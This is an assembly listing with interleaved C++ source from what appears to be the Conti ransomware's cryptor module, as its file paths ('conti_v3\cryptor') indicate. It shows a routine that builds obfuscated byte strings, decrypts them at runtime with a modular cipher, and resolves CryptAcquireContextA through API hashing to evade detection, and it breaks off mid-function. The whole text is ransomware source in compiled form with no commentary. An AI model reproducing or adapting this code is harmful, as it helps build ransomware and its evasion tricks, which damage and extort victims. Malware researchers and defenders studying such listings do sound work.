  00111	c6 44 24 61 17	 mov	 BYTE PTR $T1[rsp+49], 23
  00116	c6 44 24 62 6f	 mov	 BYTE PTR $T1[rsp+50], 111 ; 0000006fH
  0011b	c6 44 24 63 60	 mov	 BYTE PTR $T1[rsp+51], 96 ; 00000060H
  00120	c6 44 24 64 63	 mov	 BYTE PTR $T1[rsp+52], 99 ; 00000063H
  00125	c6 44 24 65 0b	 mov	 BYTE PTR $T1[rsp+53], 11
  0012a	c6 44 24 66 32	 mov	 BYTE PTR $T1[rsp+54], 50 ; 00000032H
  0012f	0f b6 44 24 31	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  00134	0f b6 44 24 30	 movzx	 eax, BYTE PTR $T1[rsp]

; 63   :         if (!isDecrypted())

  00139	84 c0		 test	 al, al
  0013b	75 54		 jne	 SHORT $LN118@GetCryptoP

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0013d	44 8b c3	 mov	 r8d, ebx
$LL119@GetCryptoP:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00140	42 0f b6 4c 04
	31		 movzx	 ecx, BYTE PTR $T1[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00146	b8 32 00 00 00	 mov	 eax, 50			; 00000032H
  0014b	2b c1		 sub	 eax, ecx
  0014d	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00150	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00155	f7 e9		 imul	 ecx
  00157	03 d1		 add	 edx, ecx
  00159	c1 fa 06	 sar	 edx, 6
  0015c	8b c2		 mov	 eax, edx
  0015e	c1 e8 1f	 shr	 eax, 31
  00161	03 d0		 add	 edx, eax
  00163	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00166	2b c8		 sub	 ecx, eax
  00168	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0016d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00170	f7 e9		 imul	 ecx
  00172	03 d1		 add	 edx, ecx
  00174	c1 fa 06	 sar	 edx, 6
  00177	8b c2		 mov	 eax, edx
  00179	c1 e8 1f	 shr	 eax, 31
  0017c	03 d0		 add	 edx, eax
  0017e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00181	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00183	42 88 4c 04 31	 mov	 BYTE PTR $T1[rsp+r8+1], cl
  00188	49 ff c0	 inc	 r8
  0018b	49 83 f8 36	 cmp	 r8, 54			; 00000036H
  0018f	72 af		 jb	 SHORT $LL119@GetCryptoP
$LN118@GetCryptoP:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 650  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xad18087f, 52);//GetProcAddress(hAdvapi32, OBFA("CryptAcquireContextA"));

  00191	ba 10 00 00 00	 mov	 edx, 16
  00196	41 b8 7f 08 18
	ad		 mov	 r8d, -1390933889	; ad18087fH
  0019c	44 8d 4a 24	 lea	 r9d, QWORD PTR [rdx+36]
  001a0	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 651  : 	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);

  001a5	41 b9 18 00 00
	00		 mov	 r9d, 24
  001ab	c7 44 24 20 00
	00 00 f0	 mov	 DWORD PTR [rsp+32], -268435456 ; f0000000H
  001b3	4c 8d 44 24 31	 lea	 r8, QWORD PTR $T1[rsp+1]
  001b8	33 d2		 xor	 edx, edx
  001ba	48 8b cf	 mov	 rcx, rdi
  001bd	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 38   : 	if (bSuccess) {

  001bf	85 c0		 test	 eax, eax
  001c1	0f 85 d8 04 00
	00		 jne	 $LN566@GetCryptoP
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  001c7	88 5c 24 68	 mov	 BYTE PTR $T2[rsp], bl
  001cb	c6 44 24 69 54	 mov	 BYTE PTR $T2[rsp+1], 84	; 00000054H
  001d0	c6 44 24 6a 58	 mov	 BYTE PTR $T2[rsp+2], 88	; 00000058H
  001d5	c6 44 24 6b 45	 mov	 BYTE PTR $T2[rsp+3], 69	; 00000045H
  001da	c6 44 24 6c 35	 mov	 BYTE PTR $T2[rsp+4], 53	; 00000035H
  001df	c6 44 24 6d 6b	 mov	 BYTE PTR $T2[rsp+5], 107 ; 0000006bH
  001e4	c6 44 24 6e 23	 mov	 BYTE PTR $T2[rsp+6], 35	; 00000023H
  001e9	c6 44 24 6f 6b	 mov	 BYTE PTR $T2[rsp+7], 107 ; 0000006bH
  001ee	c6 44 24 70 0f	 mov	 BYTE PTR $T2[rsp+8], 15
  001f3	c6 44 24 71 11	 mov	 BYTE PTR $T2[rsp+9], 17
  001f8	c6 44 24 72 05	 mov	 BYTE PTR $T2[rsp+10], 5
  001fd	c6 44 24 73 65	 mov	 BYTE PTR $T2[rsp+11], 101 ; 00000065H
  00202	c6 44 24 74 7d	 mov	 BYTE PTR $T2[rsp+12], 125 ; 0000007dH
  00207	c6 44 24 75 6a	 mov	 BYTE PTR $T2[rsp+13], 106 ; 0000006aH
  0020c	c6 44 24 76 69	 mov	 BYTE PTR $T2[rsp+14], 105 ; 00000069H
  00211	c6 44 24 77 7d	 mov	 BYTE PTR $T2[rsp+15], 125 ; 0000007dH
  00216	c6 44 24 78 45	 mov	 BYTE PTR $T2[rsp+16], 69 ; 00000045H
  0021b	c6 44 24 79 21	 mov	 BYTE PTR $T2[rsp+17], 33 ; 00000021H
  00220	c6 44 24 7a 33	 mov	 BYTE PTR $T2[rsp+18], 51 ; 00000033H
  00225	c6 44 24 7b 05	 mov	 BYTE PTR $T2[rsp+19], 5
  0022a	c6 44 24 7c 79	 mov	 BYTE PTR $T2[rsp+20], 121 ; 00000079H
  0022f	c6 44 24 7d 67	 mov	 BYTE PTR $T2[rsp+21], 103 ; 00000067H
  00234	c6 44 24 7e 2e	 mov	 BYTE PTR $T2[rsp+22], 46 ; 0000002eH
  00239	c6 44 24 7f 05	 mov	 BYTE PTR $T2[rsp+23], 5
  0023e	c6 45 80 69	 mov	 BYTE PTR $T2[rbp-232], 105 ; 00000069H
  00242	c6 45 81 7d	 mov	 BYTE PTR $T2[rbp-231], 125 ; 0000007dH
  00246	c6 45 82 33	 mov	 BYTE PTR $T2[rbp-230], 51 ; 00000033H
  0024a	c6 45 83 05	 mov	 BYTE PTR $T2[rbp-229], 5
  0024e	c6 45 84 2e	 mov	 BYTE PTR $T2[rbp-228], 46 ; 0000002eH
  00252	c6 45 85 65	 mov	 BYTE PTR $T2[rbp-227], 101 ; 00000065H
  00256	c6 45 86 67	 mov	 BYTE PTR $T2[rbp-226], 103 ; 00000067H
  0025a	c6 45 87 05	 mov	 BYTE PTR $T2[rbp-225], 5
  0025e	c6 45 88 0a	 mov	 BYTE PTR $T2[rbp-224], 10
  00262	c6 45 89 35	 mov	 BYTE PTR $T2[rbp-223], 53 ; 00000035H
  00266	c6 45 8a 36	 mov	 BYTE PTR $T2[rbp-222], 54 ; 00000036H
  0026a	c6 45 8b 59	 mov	 BYTE PTR $T2[rbp-221], 89 ; 00000059H
  0026e	c6 45 8c 11	 mov	 BYTE PTR $T2[rbp-220], 17
  00272	c6 45 8d 6b	 mov	 BYTE PTR $T2[rbp-219], 107 ; 0000006bH
  00276	c6 45 8e 7c	 mov	 BYTE PTR $T2[rbp-218], 124 ; 0000007cH
  0027a	c6 45 8f 35	 mov	 BYTE PTR $T2[rbp-217], 53 ; 00000035H
  0027e	c6 45 90 69	 mov	 BYTE PTR $T2[rbp-216], 105 ; 00000069H
  00282	c6 45 91 59	 mov	 BYTE PTR $T2[rbp-215], 89 ; 00000059H
  00286	c6 45 92 6a	 mov	 BYTE PTR $T2[rbp-214], 106 ; 0000006aH
  0028a	c6 45 93 58	 mov	 BYTE PTR $T2[rbp-213], 88 ; 00000058H
  0028e	c6 45 94 45	 mov	 BYTE PTR $T2[rbp-212], 69 ; 00000045H
  00292	c6 45 95 05	 mov	 BYTE PTR $T2[rbp-211], 5
  00296	c6 45 96 1e	 mov	 BYTE PTR $T2[rbp-210], 30
  0029a	c6 45 97 35	 mov	 BYTE PTR $T2[rbp-209], 53 ; 00000035H
  0029e	c6 45 98 6b	 mov	 BYTE PTR $T2[rbp-208], 107 ; 0000006bH
  002a2	c6 45 99 6c	 mov	 BYTE PTR $T2[rbp-207], 108 ; 0000006cH
  002a6	c6 45 9a 58	 mov	 BYTE PTR $T2[rbp-206], 88 ; 00000058H
  002aa	c6 45 9b 33	 mov	 BYTE PTR $T2[rbp-205], 51 ; 00000033H
  002ae	c6 45 9c 21	 mov	 BYTE PTR $T2[rbp-204], 33 ; 00000021H
  002b2	c6 45 9d 35	 mov	 BYTE PTR $T2[rbp-203], 53 ; 00000035H
  002b6	c6 45 9e 49	 mov	 BYTE PTR $T2[rbp-202], 73 ; 00000049H
  002ba	0f b6 44 24 69	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  002bf	0f b6 44 24 68	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  002c4	84 c0		 test	 al, al
  002c6	75 5d		 jne	 SHORT $LN242@GetCryptoP

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  002c8	4c 8b cb	 mov	 r9, rbx
  002cb	0f 1f 44 00 00	 npad	 5
$LL243@GetCryptoP:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002d0	42 0f b6 4c 0c
	69		 movzx	 ecx, BYTE PTR $T2[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  002d6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  002db	83 e9 49	 sub	 ecx, 73			; 00000049H
  002de	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  002e2	41 f7 e8	 imul	 r8d
  002e5	41 03 d0	 add	 edx, r8d
  002e8	c1 fa 06	 sar	 edx, 6
  002eb	8b c2		 mov	 eax, edx
  002ed	c1 e8 1f	 shr	 eax, 31
  002f0	03 d0		 add	 edx, eax
  002f2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002f5	44 2b c0	 sub	 r8d, eax
  002f8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  002fd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00301	41 f7 e8	 imul	 r8d
  00304	41 03 d0	 add	 edx, r8d
  00307	c1 fa 06	 sar	 edx, 6
  0030a	8b c2		 mov	 eax, edx
  0030c	c1 e8 1f	 shr	 eax, 31
  0030f	03 d0		 add	 edx, eax
  00311	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00314	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00317	46 88 44 0c 69	 mov	 BYTE PTR $T2[rsp+r9+1], r8b
  0031c	49 ff c1	 inc	 r9
  0031f	49 83 f9 36	 cmp	 r9, 54			; 00000036H
  00323	72 ab		 jb	 SHORT $LL243@GetCryptoP
$LN242@GetCryptoP:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 650  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xad18087f, 52);//GetProcAddress(hAdvapi32, OBFA("CryptAcquireContextA"));

  00325	ba 10 00 00 00	 mov	 edx, 16
  0032a	41 b8 7f 08 18
	ad		 mov	 r8d, -1390933889	; ad18087fH
  00330	44 8d 4a 24	 lea	 r9d, QWORD PTR [rdx+36]
  00334	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 651  : 	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);

  00339	41 b9 18 00 00
	00		 mov	 r9d, 24
  0033f	c7 44 24 20 08
	00 00 f0	 mov	 DWORD PTR [rsp+32], -268435448 ; f0000008H
  00347	4c 8d 44 24 69	 lea	 r8, QWORD PTR $T2[rsp+1]
  0034c	33 d2		 xor	 edx, edx
  0034e	48 8b cf	 mov	 rcx, rdi
  00351	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 43   : 	if (bSuccess) {

  00353	85 c0		 test	 eax, eax
  00355	0f 85 44 03 00
	00		 jne	 $LN566@GetCryptoP
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0035b	88 5d a0	 mov	 BYTE PTR $T3[rbp-256], bl
  0035e	c6 45 a1 50	 mov	 BYTE PTR $T3[rbp-255], 80 ; 00000050H
  00362	c6 45 a2 0a	 mov	 BYTE PTR $T3[rbp-254], 10
  00366	c6 45 a3 19	 mov	 BYTE PTR $T3[rbp-253], 25
  0036a	c6 45 a4 33	 mov	 BYTE PTR $T3[rbp-252], 51 ; 00000033H
  0036e	c6 45 a5 7a	 mov	 BYTE PTR $T3[rbp-251], 122 ; 0000007aH
  00372	c6 45 a6 70	 mov	 BYTE PTR $T3[rbp-250], 112 ; 00000070H
  00376	c6 45 a7 7a	 mov	 BYTE PTR $T3[rbp-249], 122 ; 0000007aH
  0037a	c6 45 a8 51	 mov	 BYTE PTR $T3[rbp-248], 81 ; 00000051H
  0037e	c6 45 a9 2e	 mov	 BYTE PTR $T3[rbp-247], 46 ; 0000002eH
  00382	c6 45 aa 02	 mov	 BYTE PTR $T3[rbp-246], 2
  00386	c6 45 ab 64	 mov	 BYTE PTR $T3[rbp-245], 100 ; 00000064H
  0038a	c6 45 ac 3d	 mov	 BYTE PTR $T3[rbp-244], 61 ; 0000003dH
  0038e	c6 45 ad 4c	 mov	 BYTE PTR $T3[rbp-243], 76 ; 0000004cH
  00392	c6 45 ae 1e	 mov	 BYTE PTR $T3[rbp-242], 30
  00396	c6 45 af 3d	 mov	 BYTE PTR $T3[rbp-241], 61 ; 0000003dH
  0039a	c6 45 b0 19	 mov	 BYTE PTR $T3[rbp-240], 25
  0039e	c6 45 b1 14	 mov	 BYTE PTR $T3[rbp-239], 20
  003a2	c6 45 b2 56	 mov	 BYTE PTR $T3[rbp-238], 86 ; 00000056H
  003a6	c6 45 b3 02	 mov	 BYTE PTR $T3[rbp-237], 2
  003aa	c6 45 b4 04	 mov	 BYTE PTR $T3[rbp-236], 4
  003ae	c6 45 b5 41	 mov	 BYTE PTR $T3[rbp-235], 65 ; 00000041H
  003b2	c6 45 b6 6e	 mov	 BYTE PTR $T3[rbp-234], 110 ; 0000006eH
  003b6	c6 45 b7 02	 mov	 BYTE PTR $T3[rbp-233], 2
  003ba	c6 45 b8 1e	 mov	 BYTE PTR $T3[rbp-232], 30
  003be	c6 45 b9 3d	 mov	 BYTE PTR $T3[rbp-231], 61 ; 0000003dH
  003c2	c6 45 ba 56	 mov	 BYTE PTR $T3[rbp-230], 86 ; 00000056H
  003c6	c6 45 bb 02	 mov	 BYTE PTR $T3[rbp-229], 2
  003ca	c6 45 bc 6e	 mov	 BYTE PTR $T3[rbp-228], 110 ; 0000006eH
  003ce	c6 45 bd 64	 mov	 BYTE PTR $T3[rbp-227], 100 ; 00000064H
  003d2	c6 45 be 41	 mov	 BYTE PTR $T3[rbp-226], 65 ; 00000041H
  003d6	c6 45 bf 02	 mov	 BYTE PTR $T3[rbp-225], 2
  003da	c6 45 c0 69	 mov	 BYTE PTR $T3[rbp-224], 105 ; 00000069H
  003de	c6 45 c1 33	 mov	 BYTE PTR $T3[rbp-223], 51 ; 00000033H
  003e2	c6 45 c2 61	 mov	 BYTE PTR $T3[rbp-222], 97 ; 00000061H
  003e6	c6 45 c3 38	 mov	 BYTE PTR $T3[rbp-221], 56 ; 00000038H
  003ea	c6 45 c4 2e	 mov	 BYTE PTR $T3[rbp-220], 46 ; 0000002eH
  003ee	c6 45 c5 7a	 mov	 BYTE PTR $T3[rbp-219], 122 ; 0000007aH
  003f2	c6 45 c6 0f	 mov	 BYTE PTR $T3[rbp-218], 15
  003f6	c6 45 c7 33	 mov	 BYTE PTR $T3[rbp-217], 51 ; 00000033H
  003fa	c6 45 c8 1e	 mov	 BYTE PTR $T3[rbp-216], 30
  003fe	c6 45 c9 38	 mov	 BYTE PTR $T3[rbp-215], 56 ; 00000038H
  00402	c6 45 ca 4c	 mov	 BYTE PTR $T3[rbp-214], 76 ; 0000004cH
  00406	c6 45 cb 0a	 mov	 BYTE PTR $T3[rbp-213], 10
  0040a	c6 45 cc 19	 mov	 BYTE PTR $T3[rbp-212], 25
  0040e	c6 45 cd 02	 mov	 BYTE PTR $T3[rbp-211], 2
  00412	c6 45 ce 09	 mov	 BYTE PTR $T3[rbp-210], 9
  00416	c6 45 cf 33	 mov	 BYTE PTR $T3[rbp-209], 51 ; 00000033H
  0041a	c6 45 d0 7a	 mov	 BYTE PTR $T3[rbp-208], 122 ; 0000007aH
  0041e	c6 45 d1 29	 mov	 BYTE PTR $T3[rbp-207], 41 ; 00000029H
  00422	c6 45 d2 0a	 mov	 BYTE PTR $T3[rbp-206], 10
  00426	c6 45 d3 56	 mov	 BYTE PTR $T3[rbp-205], 86 ; 00000056H
  0042a	c6 45 d4 14	 mov	 BYTE PTR $T3[rbp-204], 20
  0042e	c6 45 d5 33	 mov	 BYTE PTR $T3[rbp-203], 51 ; 00000033H
  00432	c6 45 d6 02	 mov	 BYTE PTR $T3[rbp-202], 2
  00436	c6 45 d7 6d	 mov	 BYTE PTR $T3[rbp-201], 109 ; 0000006dH
  0043a	c6 45 d8 09	 mov	 BYTE PTR $T3[rbp-200], 9
  0043e	c6 45 d9 33	 mov	 BYTE PTR $T3[rbp-199], 51 ; 00000033H
  00442	c6 45 da 7a	 mov	 BYTE PTR $T3[rbp-198], 122 ; 0000007aH
  00446	c6 45 db 2e	 mov	 BYTE PTR $T3[rbp-197], 46 ; 0000002eH
  0044a	c6 45 dc 7a	 mov	 BYTE PTR $T3[rbp-196], 122 ; 0000007aH
  0044e	c6 45 dd 2e	 mov	 BYTE PTR $T3[rbp-195], 46 ; 0000002eH
  00452	c6 45 de 61	 mov	 BYTE PTR $T3[rbp-194], 97 ; 00000061H
  00456	c6 45 df 38	 mov	 BYTE PTR $T3[rbp-193], 56 ; 00000038H
  0045a	c6 45 e0 14	 mov	 BYTE PTR $T3[rbp-192], 20
  0045e	c6 45 e1 2b	 mov	 BYTE PTR $T3[rbp-191], 43 ; 0000002bH
  00462	c6 45 e2 52	 mov	 BYTE PTR $T3[rbp-190], 82 ; 00000052H
  00466	0f b6 45 a1	 movzx	 eax, BYTE PTR $T3[rbp-255]

; 58   :         return m_isDecrypted;

  0046a	0f b6 45 a0	 movzx	 eax, BYTE PTR $T3[rbp-256]

; 63   :         if (!isDecrypted())

  0046e	84 c0		 test	 al, al
  00470	75 63		 jne	 SHORT $LN390@GetCryptoP

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00472	4c 8b cb	 mov	 r9, rbx
  00475	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL391@GetCryptoP:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00480	42 0f b6 4c 0d
	a1		 movzx	 ecx, BYTE PTR $T3[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00486	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0048b	83 e9 52	 sub	 ecx, 82			; 00000052H
  0048e	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00492	41 f7 e8	 imul	 r8d
  00495	41 03 d0	 add	 edx, r8d
  00498	c1 fa 06	 sar	 edx, 6
  0049b	8b c2		 mov	 eax, edx
  0049d	c1 e8 1f	 shr	 eax, 31
  004a0	03 d0		 add	 edx, eax
  004a2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  004a5	44 2b c0	 sub	 r8d, eax
  004a8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  004ad	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  004b1	41 f7 e8	 imul	 r8d
  004b4	41 03 d0	 add	 edx, r8d
  004b7	c1 fa 06	 sar	 edx, 6
  004ba	8b c2		 mov	 eax, edx
  004bc	c1 e8 1f	 shr	 eax, 31
  004bf	03 d0		 add	 edx, eax
  004c1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  004c4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  004c7	46 88 44 0d a1	 mov	 BYTE PTR $T3[rbp+r9-255], r8b
  004cc	49 ff c1	 inc	 r9
  004cf	49 83 f9 42	 cmp	 r9, 66			; 00000042H
  004d3	72 ab		 jb	 SHORT $LL391@GetCryptoP
$LN390@GetCryptoP:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 650  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xad18087f, 52);//GetProcAddress(hAdvapi32, OBFA("CryptAcquireContextA"));

  004d5	ba 10 00 00 00	 mov	 edx, 16
  004da	41 b8 7f 08 18
	ad		 mov	 r8d, -1390933889	; ad18087fH
  004e0	44 8d 4a 24	 lea	 r9d, QWORD PTR [rdx+36]
  004e4	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 651  : 	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);

  004e9	41 b9 18 00 00
	00		 mov	 r9d, 24
  004ef	c7 44 24 20 00
	00 00 f0	 mov	 DWORD PTR [rsp+32], -268435456 ; f0000000H
  004f7	4c 8d 45 a1	 lea	 r8, QWORD PTR $T3[rbp-255]
  004fb	33 d2		 xor	 edx, edx
  004fd	48 8b cf	 mov	 rcx, rdi
  00500	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 48   : 	if (bSuccess) {

  00502	85 c0		 test	 eax, eax
  00504	0f 85 95 01 00
	00		 jne	 $LN566@GetCryptoP
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0050a	88 5d f0	 mov	 BYTE PTR $T4[rbp-256], bl
  0050d	c6 45 f1 4d	 mov	 BYTE PTR $T4[rbp-255], 77 ; 0000004dH
  00511	c6 45 f2 04	 mov	 BYTE PTR $T4[rbp-254], 4
  00515	c6 45 f3 41	 mov	 BYTE PTR $T4[rbp-253], 65 ; 00000041H
  00519	c6 45 f4 67	 mov	 BYTE PTR $T4[rbp-252], 103 ; 00000067H
  0051d	c6 45 f5 46	 mov	 BYTE PTR $T4[rbp-251], 70 ; 00000046H
  00521	c6 45 f6 72	 mov	 BYTE PTR $T4[rbp-250], 114 ; 00000072H
  00525	c6 45 f7 46	 mov	 BYTE PTR $T4[rbp-249], 70 ; 00000046H
  00529	c6 45 f8 62	 mov	 BYTE PTR $T4[rbp-248], 98 ; 00000062H
  0052d	c6 45 f9 7d	 mov	 BYTE PTR $T4[rbp-247], 125 ; 0000007dH
  00531	c6 45 fa 5a	 mov	 BYTE PTR $T4[rbp-246], 90 ; 0000005aH
  00535	c6 45 fb 74	 mov	 BYTE PTR $T4[rbp-245], 116 ; 00000074H
  00539	c6 45 fc 3b	 mov	 BYTE PTR $T4[rbp-244], 59 ; 0000003bH
  0053d	c6 45 fd 78	 mov	 BYTE PTR $T4[rbp-243], 120 ; 00000078H
  00541	c6 45 fe 2b	 mov	 BYTE PTR $T4[rbp-242], 43 ; 0000002bH
  00545	c6 45 ff 3b	 mov	 BYTE PTR $T4[rbp-241], 59 ; 0000003bH
  00549	c6 45 00 41	 mov	 BYTE PTR $T4[rbp-240], 65 ; 00000041H
  0054d	c6 45 01 57	 mov	 BYTE PTR $T4[rbp-239], 87 ; 00000057H
  00551	c6 45 02 4c	 mov	 BYTE PTR $T4[rbp-238], 76 ; 0000004cH
  00555	c6 45 03 5a	 mov	 BYTE PTR $T4[rbp-237], 90 ; 0000005aH
  00559	c6 45 04 05	 mov	 BYTE PTR $T4[rbp-236], 5
  0055d	c6 45 05 10	 mov	 BYTE PTR $T4[rbp-235], 16
  00561	c6 45 06 48	 mov	 BYTE PTR $T4[rbp-234], 72 ; 00000048H
  00565	c6 45 07 5a	 mov	 BYTE PTR $T4[rbp-233], 90 ; 0000005aH
  00569	c6 45 08 2b	 mov	 BYTE PTR $T4[rbp-232], 43 ; 0000002bH
  0056d	c6 45 09 3b	 mov	 BYTE PTR $T4[rbp-231], 59 ; 0000003bH
  00571	c6 45 0a 4c	 mov	 BYTE PTR $T4[rbp-230], 76 ; 0000004cH
  00575	c6 45 0b 5a	 mov	 BYTE PTR $T4[rbp-229], 90 ; 0000005aH
  00579	c6 45 0c 48	 mov	 BYTE PTR $T4[rbp-228], 72 ; 00000048H
  0057d	c6 45 0d 74	 mov	 BYTE PTR $T4[rbp-227], 116 ; 00000074H
  00581	c6 45 0e 10	 mov	 BYTE PTR $T4[rbp-226], 16
  00585	c6 45 0f 5a	 mov	 BYTE PTR $T4[rbp-225], 90 ; 0000005aH
  00589	c6 45 10 5e	 mov	 BYTE PTR $T4[rbp-224], 94 ; 0000005eH
  0058d	c6 45 11 67	 mov	 BYTE PTR $T4[rbp-223], 103 ; 00000067H
  00591	c6 45 12 35	 mov	 BYTE PTR $T4[rbp-222], 53 ; 00000035H
  00595	c6 45 13 51	 mov	 BYTE PTR $T4[rbp-221], 81 ; 00000051H
  00599	c6 45 14 7d	 mov	 BYTE PTR $T4[rbp-220], 125 ; 0000007dH
  0059d	c6 45 15 46	 mov	 BYTE PTR $T4[rbp-219], 70 ; 00000046H
  005a1	c6 45 16 6d	 mov	 BYTE PTR $T4[rbp-218], 109 ; 0000006dH
  005a5	c6 45 17 67	 mov	 BYTE PTR $T4[rbp-217], 103 ; 00000067H
  005a9	c6 45 18 2b	 mov	 BYTE PTR $T4[rbp-216], 43 ; 0000002bH
  005ad	c6 45 19 51	 mov	 BYTE PTR $T4[rbp-215], 81 ; 00000051H
  005b1	c6 45 1a 78	 mov	 BYTE PTR $T4[rbp-214], 120 ; 00000078H
  005b5	c6 45 1b 04	 mov	 BYTE PTR $T4[rbp-213], 4
  005b9	c6 45 1c 41	 mov	 BYTE PTR $T4[rbp-212], 65 ; 00000041H
  005bd	c6 45 1d 5a	 mov	 BYTE PTR $T4[rbp-211], 90 ; 0000005aH
  005c1	c6 45 1e 6e	 mov	 BYTE PTR $T4[rbp-210], 110 ; 0000006eH
  005c5	c6 45 1f 67	 mov	 BYTE PTR $T4[rbp-209], 103 ; 00000067H
  005c9	c6 45 20 46	 mov	 BYTE PTR $T4[rbp-208], 70 ; 00000046H
  005cd	c6 45 21 14	 mov	 BYTE PTR $T4[rbp-207], 20
  005d1	c6 45 22 04	 mov	 BYTE PTR $T4[rbp-206], 4
  005d5	c6 45 23 4c	 mov	 BYTE PTR $T4[rbp-205], 76 ; 0000004cH
  005d9	c6 45 24 57	 mov	 BYTE PTR $T4[rbp-204], 87 ; 00000057H
  005dd	c6 45 25 67	 mov	 BYTE PTR $T4[rbp-203], 103 ; 00000067H
  005e1	c6 45 26 5a	 mov	 BYTE PTR $T4[rbp-202], 90 ; 0000005aH
  005e5	c6 45 27 33	 mov	 BYTE PTR $T4[rbp-201], 51 ; 00000033H
  005e9	c6 45 28 6e	 mov	 BYTE PTR $T4[rbp-200], 110 ; 0000006eH
  005ed	c6 45 29 67	 mov	 BYTE PTR $T4[rbp-199], 103 ; 00000067H
  005f1	c6 45 2a 46	 mov	 BYTE PTR $T4[rbp-198], 70 ; 00000046H
  005f5	c6 45 2b 7d	 mov	 BYTE PTR $T4[rbp-197], 125 ; 0000007dH
  005f9	c6 45 2c 46	 mov	 BYTE PTR $T4[rbp-196], 70 ; 00000046H
  005fd	c6 45 2d 7d	 mov	 BYTE PTR $T4[rbp-195], 125 ; 0000007dH
  00601	c6 45 2e 35	 mov	 BYTE PTR $T4[rbp-194], 53 ; 00000035H
  00605	c6 45 2f 51	 mov	 BYTE PTR $T4[rbp-193], 81 ; 00000051H
  00609	c6 45 30 57	 mov	 BYTE PTR $T4[rbp-192], 87 ; 00000057H
  0060d	c6 45 31 3e	 mov	 BYTE PTR $T4[rbp-191], 62 ; 0000003eH
  00611	c6 45 32 77	 mov	 BYTE PTR $T4[rbp-190], 119 ; 00000077H
  00615	0f b6 45 f1	 movzx	 eax, BYTE PTR $T4[rbp-255]

; 58   :         return m_isDecrypted;

  00619	0f b6 45 f0	 movzx	 eax, BYTE PTR $T4[rbp-256]

; 63   :         if (!isDecrypted())

  0061d	84 c0		 test	 al, al
  0061f	75 4f		 jne	 SHORT $LN538@GetCryptoP
$LL539@GetCryptoP:

